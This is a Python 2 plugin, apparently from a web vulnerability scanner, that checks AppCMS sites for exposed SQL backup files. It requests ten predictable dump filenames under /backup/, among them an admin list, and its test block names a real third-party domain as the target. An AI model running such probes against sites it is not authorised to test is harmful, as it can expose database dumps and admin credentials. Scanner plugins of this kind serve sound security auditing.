#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'AppCMS Backup Files Download',
	'AUTHOR':'1c3z,wjk',
	'TIME':'20150325',
	'WEB':'http://www.wooyun.org/bugs/wooyun-2014-077157',
	'DESCRIPTION':'appcms 备份文件下载'
}

opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'appcms':
			return True
	return False

def Audit(services):
	url = services['url'] + "backup/"
	sqlFile = ['appcms_admin_list_0.sql', 'appcms_app_history_0.sql', 'appcms_app_list_0.sql', 'appcms_cate_relation_0.sql', 'appcms_category_0.sql', 'appcms_flink_0.sql', 'appcms_info_list_0.sql', 'appcms_recommend_area_0.sql', 'appcms_resource_list_0.sql', 'appcms_url_rewrite_0.sql']
	try:
		for f in sqlFile:
			rqu= requests.get(url + f)
			if rqu.status_code == 200:
				security_warning("find backup files:" + url + f)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
